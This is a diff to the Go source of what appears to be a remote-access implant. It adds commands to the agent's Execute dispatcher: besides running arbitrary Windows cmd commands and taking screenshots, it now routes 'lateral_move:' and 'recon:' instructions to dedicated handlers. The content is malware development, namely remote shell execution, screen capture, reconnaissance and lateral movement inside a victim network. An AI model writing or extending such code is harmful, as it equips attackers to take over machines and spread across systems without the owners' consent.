@@ -11,23 +11,37 @@ import (
 )
 
 // Execute 执行命令并返回结果
-// 支持特殊命令：screenshot
+// 支持特殊命令：screenshot, lateral_move:*, recon:*
 func Execute(cmdStr string) string {
+	cmdStr = strings.TrimSpace(cmdStr)
+
 	// 检查是否是截图命令
-	if strings.TrimSpace(cmdStr) == "screenshot" {
+	if cmdStr == "screenshot" {
 		return TakeScreenshot()
+	}
+
+	// 检查是否是横向移动命令
+	if strings.HasPrefix(cmdStr, "lateral_move:") {
+		jsonData := strings.TrimPrefix(cmdStr, "lateral_move:")
+		return ExecuteLateralMove(jsonData)
+	}
+
+	// 检查是否是侦察命令
+	if strings.HasPrefix(cmdStr, "recon:") {
+		jsonData := strings.TrimPrefix(cmdStr, "recon:")
+		return ExecuteRecon(jsonData)
 	}
 
 	// 执行普通的 CMD 命令
 	cmd := exec.Command("cmd", "/C", cmdStr)
 	output, _ := cmd.CombinedOutput()
-	
+
 	// 处理中文编码问题
 	utf8Output, err := gbkToUtf8(output)
 	if err != nil {
 		utf8Output = string(output)
 	}
-	
+
 	return utf8Output
 }
 
